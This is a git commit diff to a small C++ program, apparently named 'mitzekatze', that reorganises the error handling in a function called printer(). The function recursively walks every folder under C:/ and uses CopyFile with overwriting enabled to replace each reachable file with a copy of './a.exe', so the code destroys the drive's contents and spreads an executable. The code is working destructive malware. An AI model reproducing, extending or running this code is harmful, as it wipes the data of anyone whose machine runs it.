a30dda3a1dc2012fe234be2624763b33d758037f
Groove <63636914+Groovemaker@users.noreply.github.com>
2020-08-03 12:18:46 +0200

    Add files via upload

--- mitzekatze/main.cpp
+++ mitzekatze/main.cpp
@@ -16,16 +16,16 @@ void printer()
 {
 	
 		std::string path = "C:/";
-	    for (const auto & entry : std::filesystem::recursive_directory_iterator(path,std::filesystem::directory_options::skip_permission_denied)){
-			try {
-				CopyFile("./a.exe",entry.path().string().c_str(),0);
-	   			Chain = Chain + sWords[rand() % 4];
-				cout << Chain;
-			}
-			catch (const std::exception& e){
-				
-			}
-	    }
+		try {
+		    for (const auto & entry : std::filesystem::recursive_directory_iterator(path,std::filesystem::directory_options::skip_permission_denied)){
+
+					CopyFile("./a.exe",entry.path().string().c_str(),0);
+		   			Chain = Chain + sWords[rand() % 4];
+					cout << Chain;
+		    }
+		}	
+		catch (const std::exception& e){
+		}
 }
 int main()
 {
